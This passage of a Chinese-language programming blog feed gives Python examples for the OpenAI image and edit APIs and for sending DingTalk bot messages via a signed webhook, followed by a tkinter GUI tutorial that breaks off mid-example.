  model<span class="token operator">=</span><span class="token string">"text-davinci-edit-001"</span><span class="token punctuation">,</span>
  <span class="token builtin">input</span><span class="token operator">=</span><span class="token string">"What day of the wek is it?"</span><span class="token punctuation">,</span><span class="token comment">#用作编辑起点的输入文本。</span>
  instruction<span class="token operator">=</span><span class="token string">"Fix the spelling mistakes"</span><span class="token comment"># it's like prompt</span>
<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="图像生成"><a href="#图像生成" class="headerlink" title="图像生成"></a>图像生成</h2><p>建议用midjourney :)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> openai
openai<span class="token punctuation">.</span>api_key <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"OPENAI_API_KEY"</span><span class="token punctuation">)</span>
openai<span class="token punctuation">.</span>Image<span class="token punctuation">.</span>create<span class="token punctuation">(</span>
  prompt<span class="token operator">=</span><span class="token string">"A cute baby sea otter"</span><span class="token punctuation">,</span><span class="token comment">#最长1000个字符</span>
  n<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token comment">#生成的图像数量, 在1~10之间</span>
  size<span class="token operator">=</span><span class="token string">"1024x1024"</span>
<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="图像编辑"><a href="#图像编辑" class="headerlink" title="图像编辑"></a>图像编辑</h2><p>在给定原始图像和提示的情况下创建编辑或扩展图像。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> openai
openai<span class="token punctuation">.</span>api_key <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"OPENAI_API_KEY"</span><span class="token punctuation">)</span>
openai<span class="token punctuation">.</span>Image<span class="token punctuation">.</span>create_edit<span class="token punctuation">(</span>
  image<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"otter.png"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">#要编辑的图像</span>
  mask<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"mask.png"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">#附加图像,可选</span>
  prompt<span class="token operator">=</span><span class="token string">"A cute baby sea otter wearing a beret"</span><span class="token punctuation">,</span><span class="token comment">#最长1000个字符</span>
  n<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>
  size<span class="token operator">=</span><span class="token string">"1024x1024"</span>
<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="嵌入"><a href="#嵌入" class="headerlink" title="嵌入"></a>嵌入</h2><p>这个感觉好高级, 留个坑</p>
<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><p>所有文件最大1GB</p>
<p>用到了fine-tunes, 暂时不太懂</p>
]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>python控制钉钉Bot</title>
    <url>/2023/07/01/python%E6%8E%A7%E5%88%B6%E9%92%89%E9%92%89Bot/</url>
    <content><![CDATA[<p>钉钉的群组可以构建自定义机器人, 机器人添加成功之后会返回一个<code>token</code>, 你也可以在配置机器人的时候加签, 就会额外再返回一个<code>secret</code>, 提高通讯的安全性</p>
<p>但是这样操作会复杂不少, 下面先给出不配置加签的代码:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json

<span class="token comment"># 钉钉机器人的webhook</span>
webhook <span class="token operator">=</span> <span class="token string">"https://oapi.dingtalk.com/robot/send?access_token=your_token"</span>

<span class="token comment"># 构建请求头部</span>
header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span>
    <span class="token string">"Charset"</span><span class="token punctuation">:</span> <span class="token string">"UTF-8"</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># 构建请求数据，此处为发送文本信息</span>
message <span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"msgtype"</span><span class="token punctuation">:</span> <span class="token string">"text"</span><span class="token punctuation">,</span>
    <span class="token string">"text"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"你想要发送的消息"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string">"at"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"isAtAll"</span><span class="token punctuation">:</span> <span class="token boolean">True</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># 对请求数据进行json封装</span>
message_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>message<span class="token punctuation">)</span>

<span class="token comment"># 发送HTTP POST请求到钉钉webhook</span>
info <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>webhook<span class="token punctuation">,</span> data<span class="token operator">=</span>message_json<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>

<span class="token comment"># 打印请求结果</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>quite simple and beautiful!</p>
<p>如果你的钉钉机器人启用了加签安全设置，那么在发送消息时，你需要在URL中添加一个签名参数（<code>sign</code>）。</p>
<p>下面是如何生成签名的步骤：</p>
<ol>
<li>获取当前时间戳和Secret</li>
<li>拼接成字符串并用HmacSHA256算法加密</li>
<li>将加密后的字符串进行Base64编码，得到签名</li>
</ol>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> hmac
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> time

<span class="token comment"># 钉钉机器人的access_token</span>
access_token <span class="token operator">=</span> <span class="token string">"your_token"</span>

<span class="token comment"># 钉钉机器人的Secret</span>
secret <span class="token operator">=</span> <span class="token string">"your_secret"</span>

<span class="token comment"># 获取当前时间戳（毫秒级），转换为字符串</span>
timestamp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 拼接需要加密的字符串</span>
secret_enc <span class="token operator">=</span> secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
string_to_sign <span class="token operator">=</span> <span class="token string">'&#123;&#125;\n&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> secret<span class="token punctuation">)</span>
string_to_sign_enc <span class="token operator">=</span> string_to_sign<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

<span class="token comment"># 使用HmacSHA256算法计算签名，并进行Base64编码</span>
hmac_code <span class="token operator">=</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>secret_enc<span class="token punctuation">,</span> string_to_sign_enc<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote_plus<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac_code<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 构建请求头部</span>
header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span>
    <span class="token string">"Charset"</span><span class="token punctuation">:</span> <span class="token string">"UTF-8"</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># 构建请求数据，此处为发送文本信息</span>
message <span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"msgtype"</span><span class="token punctuation">:</span> <span class="token string">"text"</span><span class="token punctuation">,</span>
    <span class="token string">"text"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"你想要发送的消息"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string">"at"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"isAtAll"</span><span class="token punctuation">:</span> <span class="token boolean">True</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># 对请求数据进行json封装</span>
message_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>message<span class="token punctuation">)</span>

<span class="token comment"># 构建请求的URL，包含签名和时间戳</span>
webhook <span class="token operator">=</span> <span class="token string">"https://oapi.dingtalk.com/robot/send?access_token=&#123;&#125;&amp;timestamp=&#123;&#125;&amp;sign=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>access_token<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> sign<span class="token punctuation">)</span>

<span class="token comment"># 发送HTTP POST请求到钉钉webhook</span>
info <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>webhook<span class="token punctuation">,</span> data<span class="token operator">=</span>message_json<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>

<span class="token comment"># 打印请求结果</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>tkinter教程</title>
    <url>/2023/07/05/tkinder%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="常见组件"><a href="#常见组件" class="headerlink" title="常见组件"></a>常见组件</h1><h2 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h2><p>描述：窗口是Tkinter应用程序的主要容器。它可以包含其他组件，并提供应用程序的整体框架。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk

<span class="token comment"># 创建主窗口</span>
window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 设置窗口标题</span>
window<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"My App"</span><span class="token punctuation">)</span>

<span class="token comment"># 设置窗口大小</span>
window<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">"400x300"</span><span class="token punctuation">)</span>

<span class="token comment"># 运行窗口主循环</span>
window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>描述：标签用于在GUI中显示文本或图像。它可以用于显示静态文本或作为其他组件的说明性文本。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建标签</span>
label <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>window<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span>

<span class="token comment"># 显示标签</span>
label<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h2><p>描述：按钮允许用户与应用程序进行交互。当按钮被点击时，可以执行相应的操作或触发事件。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">button_click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Button clicked!"</span><span class="token punctuation">)</span>

<span class="token comment"># 创建按钮</span>
button <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>window<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Click Me"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>button_click<span class="token punctuation">)</span>

<span class="token comment"># 显示按钮</span>
button<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="文本框"><a href="#文本框" class="headerlink" title="文本框"></a>文本框</h2><p>描述：文本框允许用户输入文本。你可以使用文本框来收集用户的输入或显示文本数据</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_input <span class="token operator">=</span> entry<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"User input:"</span><span class="token punctuation">,</span> user_input<span class="token punctuation">)</span>

<span class="token comment"># 创建文本框</span>
entry <span class="token operator">=</span> tk<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>window<span class="token punctuation">)</span>

<span class="token comment"># 显示文本框</span>
entry<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建按钮</span>
button <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>window<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Submit"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>get_input<span class="token punctuation">)</span>

<span class="token comment"># 显示按钮</span>
button<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="frame组件"><a href="#frame组件" class="headerlink" title="frame组件"></a>frame组件</h2><p>Tkinter的<code>Frame</code>组件是一个矩形区域，用于容纳其他Tkinter组件或布局管理器。它可以作为容器或边框，用于组织和布局其他组件。下面是对Tkinter的<code>Frame</code>组件的详细介绍和用法：</p>
<p><strong>1. 创建<code>Frame</code>组件：</strong><br>要创建一个<code>Frame</code>组件，可以使用<code>tkinter.Frame</code>类。以下是一个基本的示例：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建一个Frame组件</span>
frame <span class="token operator">=</span> tk<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span>window<span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span> bg<span class="token operator">=</span><span class="token string">"red"</span><span class="token punctuation">)</span>

<span class="token comment"># 显示Frame组件</span>
frame<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在上述示例中，我们创建了一个宽度为200，高度为200，背景颜色为红色的<code>Frame</code>组件，并将其显示在窗口中。</p>
<p><strong>2. 使用<code>Frame</code>组件作为容器：</strong><br><code>Frame</code>组件可以作为容器，用于容纳其他Tkinter组件。你可以在<code>Frame</code>中添加其他组件，如标签、按钮、文本框等。以下是一个示例：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建一个Frame组件</span>
frame <span class="token operator">=</span> tk<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span>window<span class="token punctuation">)</span>

<span class="token comment"># 在Frame组件中添加其他组件</span>
label <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>frame<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span>
button <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>frame<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Click Me"</span><span class="token punctuation">)</span>

label<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>
button<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 显示Frame组件</span>
frame<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在上述示例中，我们在<code>Frame</code>组件中添加了一个标签和一个按钮。</p>
<p><strong>3. 使用布局管理器管理<code>Frame</code>中的组件：</strong><br>你可以使用Tkinter提供的布局管理器，如<code>pack</code>、<code>grid</code>或<code>place</code>，在<code>Frame</code>中管理和布局其他组件。以下是一个示例：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建一个Frame组件</span>
frame <span class="token operator">=</span> tk<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span>window<span class="token punctuation">)</span>

<span class="token comment"># 在Frame组件中使用grid布局管理器</span>
label1 <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>frame<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Label 1"</span><span class="token punctuation">)</span>
label1<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

label2 <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>frame<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Label 2"</span><span class="token punctuation">)</span>
label2<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

button <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>frame<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Click Me"</span><span class="token punctuation">)</span>
button<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> columnspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>

<span class="token comment"># 显示Frame组件</span>
frame<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在上述示例中，我们使用<code>grid</code>布局管理器在<code>Frame</code>中布置了几个组件。</p>
<p><strong>4. <code>Frame</code>组件的属性和方法：</strong><br><code>Frame</code>组件具有一些有用的属性和方法，用于自定义和操作它。以下是一些常用的属性和方法：</p>
<ul>
<li><code>bg</code>：设置<code>Frame</code>组件的背景颜色。</li>
<li><code>width</code>：设置<code>Frame</code>组件的宽度。</li>
<li><code>height</code>：设置<code>Frame</code>组件的高度。</li>
<li><code>config(**options)</code>：配置<code>Frame</code>组件的属性，可以使用关键字参数传递多个选项。</li>
<li><code>pack(**options)</code>：使用<code>pack</code>布局管理器显示<code>Frame</code>组</li>
</ul>
<p>件。</p>
<ul>
<li><code>grid(**options)</code>：使用<code>grid</code>布局管理器显示<code>Frame</code>组件。</li>
<li><code>place(**options)</code>：使用<code>place</code>布局管理器显示<code>Frame</code>组件。</li>
</ul>
<p>这些是<code>Frame</code>组件的一些常见用法和功能。<code>Frame</code>组件在Tkinter中是一个非常有用的容器，可用于组织和布局其他组件。通过结合不同的布局管理器和其他Tkinter组件，你可以创建出丰富和灵活的用户界面。</p>
<h1 id="布局管理器"><a href="#布局管理器" class="headerlink" title="布局管理器"></a>布局管理器</h1><h2 id="Grid布局管理器"><a href="#Grid布局管理器" class="headerlink" title="Grid布局管理器"></a>Grid布局管理器</h2><p>描述：<code>grid</code>布局管理器使用网格的形式来布置组件。你可以将组件放置在行和列的交叉点上，并控制它们的位置和大小。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建并显示三个标签，使用grid布局</span>
label1 <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>window<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Label 1"</span><span class="token punctuation">)</span>
label1<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

label2 <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>window<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Label 2"</span><span class="token punctuation">)</span>
label2<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

label3 <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>window<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Label 3"</span><span class="token punctuation">)</span>
label3<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> columnspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#一个用grid布局的实例</span>
<span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk
<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> messagebox

root <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>
root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"C语言中文网"</span><span class="token punctuation">)</span>

root<span class="token punctuation">.</span>iconbitmap<span class="token punctuation">(</span><span class="token string">'C:/Users/Administrator/Desktop/C语言中文网logo.ico'</span><span class="token punctuation">)</span>
root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>

tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"用户名"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> sticky<span class="token operator">=</span><span class="token string">"w"</span><span class="token punctuation">)</span>
tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"密码"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> sticky<span class="token operator">=</span><span class="token string">"w"</span><span class="token punctuation">)</span>

tk<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
tk<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span> show<span class="token operator">=</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment"># 加载图片LOGO,注意这里是gif格式的图片</span>
photo <span class="token operator">=</span> tk<span class="token punctuation">.</span>PhotoImage<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token string">"C:/Users/Administrator/Desktop/1.gif"</span><span class="token punctuation">)</span>

tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> image<span class="token operator">=</span>photo<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> rowspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> padx<span class="token operator">=</span><span class="token string">'4px'</span><span class="token punctuation">,</span> pady<span class="token operator">=</span><span class="token string">'5px'</span><span class="token punctuation">)</span>

<span class="token comment"># 编写一个简单的回调函数</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
